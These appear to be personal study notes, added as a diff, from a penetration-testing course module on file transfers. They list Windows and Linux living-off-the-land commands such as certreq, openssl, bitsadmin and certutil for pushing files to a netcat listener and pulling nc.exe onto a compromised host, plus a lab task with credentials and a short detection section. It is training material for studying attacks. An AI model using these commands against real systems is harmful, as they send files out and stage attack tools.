@@ -652,3 +652,50 @@ c:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\Windows\win.ini
 this will send the file to our Netcat session, and we can copy-paste its contents/
 \\File Received in our Netcat Session
 $sudo nc -lvnp 8000
+-if get an error when running certreq.exe the ver using may not contain the -Post para. download an updated version
+\\GTFOBins
+to search and download and upload func in https://gtfobins.github.io/
+-we can use +file download or +file upload
+-let use OpenSSL https://www.openssl.org/ it's frequently installed and often included in other soft distribution, with sysadmins using it to generate security certificates, among other tasks, OpenSSL can be used to send files "nc stle"
+\\Create certificate in our pwnbox
+$openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+\\Stand up the Server in our Pwnbox
+$openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+>> with the server running, we need to download the file from the compromised machine
+\\Download File from the Compromised machine
+$openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+\\Other Common Living off the Land tools
+\\Bitsadmin Download function
+the https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal
+can be used to download files from HTTP sites and SMB shares. it "intelligently" checks host and network ultilization into account to minimize the impact on a user's foreground work
+\\File Download with Bitsadmin
+PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\User\htb-student\Desktop\nc.exe
+\\Download
+PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe -Destination "C:\Windows\Temp\nc.exe"
+\\Certutil
+casey smith (@subTee) found that Certutil can be used to download arbitrary files, it is avail in all windows ver, and has been a popular file transfer tech, serving as a defacto wget for Windows.
+hwer the Antimalware scan interface (AMSI) currently detects this as malicious Certutil usage
+\\Download a File with Certutil
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+\\Download a File with Certutil
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+\\Extra practice
+persuing the LOLBAS and GTFOBins websites and experiment with as many file transfer methods as possible. the more obscure the better,
+-we never know when we need one of these binaries during an assessment, and it'll save time if you already have detailed notes on mutiple options. 
+some of the binaries that can be leveraged for file transfer may surprise us
+<test>Connect to the target machine via RDP
+ ((Username: htb-student | Password:HTB_@cademy_stdnt!)) and use Living Off The Land techniques 
+ presented in this section or any other found on the LOLBAS and GTFOBins websites to transfer
+  files between the Pwnbox and the Windows target. Type "DONE" when finished.
+  10.129.254.157 (Win)   10.10.15.85 (linux)
+$$xfreerdp /v:<ip> /u:htb-student /p:<password>
+PS> certreq.exe -Post -config http://10.129.254.157:8000/ c:\windows\win.ini
+$sudo nc -lvnp 8000
+\\\\\\=================================================
+Detection
+-Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation hwer although the process of whitelisting all command line in a particular environment is initailly time comsuming.
+is very robust and allows for quick detection and alerting on any unusual command lines.
+-Most client-serve protocols require the client and server to negotiate how content will be delivered before exchanging infor. this is common with the http protocol. there is a need for interoperability amongst diff web svr and web broswer types to ensure tat users have the same exp no matter their browser.HTTP client is connecting to it. for EX firefox, chrome, etc
+-user agents are not only used to identify web browsers, but anything acting as an HTTP client and conn to a web svr via HTTP can have a user agent string (ie cURL, a custom python scrip, or common tools such as sqlmap, or Nmap)
+-org can take some steps to identify potential user agent strings by first building a list of known legitimate user agent string. user agent used by default OS processes. common user agents used by update services such as Windows update, and antivirus updates, etc. these can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. 
+-this https://useragentstring.com/index.php
